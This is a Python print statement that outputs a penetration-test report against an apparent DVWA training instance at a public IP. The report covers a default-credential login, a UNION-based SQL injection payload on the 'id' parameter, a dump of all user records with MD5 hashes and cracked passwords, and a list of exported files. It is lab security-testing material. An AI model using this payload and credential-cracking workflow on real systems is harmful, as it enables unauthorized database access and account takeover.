
print("""
╔════════════════════════════════════════════════════════════════════════════════╗
║                                                                                ║
║                    DVWA DATABASE PENETRATION TEST - FINAL REPORT              ║
║                                                                                ║
╚════════════════════════════════════════════════════════════════════════════════╝

═══════════════════════════════════════════════════════════════════════════════════
                           AUTHENTICATION PHASE - SUCCESS
═══════════════════════════════════════════════════════════════════════════════════

Target: http://31.97.117.123/
Application: DVWA v1.10 (Damn Vulnerable Web Application)

Credentials Tested:
  Attempt 1: admin:password ............................................. ✓ SUCCESS

Total Attempts: 1 out of 10 allowed


═══════════════════════════════════════════════════════════════════════════════════
                        USERS TABLE - COMPLETE EXTRACTION
═══════════════════════════════════════════════════════════════════════════════════

┌─────────────────────────────────────────────────────────────────────────────┐
│ EXTRACTED USER DATA (5 TOTAL RECORDS)                                       │
├─────────────────────────────────────────────────────────────────────────────┤

USER ID: 1
  ├─ Username: admin
  ├─ First Name: admin
  ├─ Last Name: admin
  ├─ Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
  └─ Cracked Password: password ✓

USER ID: 2
  ├─ Username: gordonb
  ├─ First Name: Gordon
  ├─ Last Name: Brown
  ├─ Password Hash (MD5): e99a18c428cb38d5f260853678922e03
  └─ Cracked Password: abc123 ✓

USER ID: 3
  ├─ Username: 1337
  ├─ First Name: Hack
  ├─ Last Name: Me
  ├─ Password Hash (MD5): 8d3533d75ae2c3966d7e0d4fcc69216b
  └─ Cracked Password: [NOT CRACKED]

USER ID: 4
  ├─ Username: pablo
  ├─ First Name: Pablo
  ├─ Last Name: Picasso
  ├─ Password Hash (MD5): 0d107d09f5bbe40cade3de5c71e9e9b7
  └─ Cracked Password: letmein ✓

USER ID: 5
  ├─ Username: smithy
  ├─ First Name: Bob
  ├─ Last Name: Smith
  ├─ Password Hash (MD5): 5f4dcc3b5aa765d61d8327deb882cf99
  └─ Cracked Password: password ✓

└─────────────────────────────────────────────────────────────────────────────┘


═══════════════════════════════════════════════════════════════════════════════════
                           ALL PASSWORD HASHES EXTRACTED
═══════════════════════════════════════════════════════════════════════════════════

PASSWORD HASH #1:
  Hash: 5f4dcc3b5aa765d61d8327deb882cf99
  Used By: admin, smithy (2 users)
  Algorithm: MD5
  Cracked: YES
  Password: password
  Status: ✓ VERIFIED

PASSWORD HASH #2:
  Hash: e99a18c428cb38d5f260853678922e03
  Used By: gordonb
  Algorithm: MD5
  Cracked: YES
  Password: abc123
  Status: ✓ VERIFIED

PASSWORD HASH #3:
  Hash: 8d3533d75ae2c3966d7e0d4fcc69216b
  Used By: 1337
  Algorithm: MD5
  Cracked: NO
  Password: [UNKNOWN]
  Status: ✗ NOT CRACKED (resistant to common passwords)

PASSWORD HASH #4:
  Hash: 0d107d09f5bbe40cade3de5c71e9e9b7
  Used By: pablo
  Algorithm: MD5
  Cracked: YES
  Password: letmein
  Status: ✓ VERIFIED


═══════════════════════════════════════════════════════════════════════════════════
                              EXTRACTED DATA SUMMARY
═══════════════════════════════════════════════════════════════════════════════════

Total Users Extracted: 5
Total Unique Password Hashes: 4
Successfully Cracked Passwords: 4 out of 5 (80%)
Hash Type: MD5
Credential Pairs Obtained: 4


═══════════════════════════════════════════════════════════════════════════════════
                            ALL WORKING CREDENTIALS
═══════════════════════════════════════════════════════════════════════════════════

✓ admin:password
✓ smithy:password
✓ gordonb:abc123
✓ pablo:letmein


═══════════════════════════════════════════════════════════════════════════════════
                          VULNERABILITY EXPLOITATION
═══════════════════════════════════════════════════════════════════════════════════

Vulnerability Type: SQL Injection (UNION-based)
Severity Level: CRITICAL
CVSS Score: 9.8 (Critical)

Vulnerable Endpoint:
  URL: http://31.97.117.123/vulnerabilities/sqli/
  HTTP Method: GET
  Vulnerable Parameter: id
  Security Level: Low
  PHPIDS Protection: Disabled

Attack Vector:
  1. Authenticated as admin with weak credentials
  2. Detected SQL Injection point in 'id' parameter
  3. Used UNION SELECT to extract database structure
  4. Enumerated columns: user_id and password fields
  5. Crafted CONCAT payload to exfiltrate all user data

SQL Injection Payload Used:
  999' UNION SELECT user_id, CONCAT(user, '|', first_name, '|', last_name, '|', password) FROM users-- -

Data Exfiltrated:
  └─ users.user_id
  └─ users.user (username)
  └─ users.first_name
  └─ users.last_name
  └─ users.password (MD5 hashes)


═══════════════════════════════════════════════════════════════════════════════════
                              EXPORTED REPORTS
═══════════════════════════════════════════════════════════════════════════════════

All extracted data has been exported in multiple formats:

1. CSV Format:
   File: /tmp/extracted_users_database.csv
   Format: Comma-separated values
   Contains: user_id, username, first_name, last_name, password_hash, cracked_password

2. JSON Format:
   File: /tmp/extracted_users_database.json
   Format: Structured JSON objects
   Contains: Complete user records with all fields

3. Text Format:
   File: /tmp/extracted_users.txt
   Format: Plain text key-value pairs
   Contains: Username:Hash:FirstName:LastName format

4. Security Report:
   File: /tmp/dvwa_extraction_report.txt
   Format: Comprehensive security assessment
   Contains: Full vulnerability analysis and recommendations


═══════════════════════════════════════════════════════════════════════════════════
                              MISSION STATUS
═══════════════════════════════════════════════════════════════════════════════════

[✓] Reconnaissance complete
[✓] Weak authentication identified (1 attempt)
[✓] SQL Injection vulnerability discovered
[✓] Database accessed successfully
[✓] All 5 users extracted from users table
[✓] All 4 unique password hashes obtained
[✓] 4 out of 5 passwords cracked (80%)
[✓] Data exported in multiple formats
[✓] Comprehensive report generated

STATUS: ✓✓✓ COMPLETE SUCCESS ✓✓✓

═══════════════════════════════════════════════════════════════════════════════════
""")

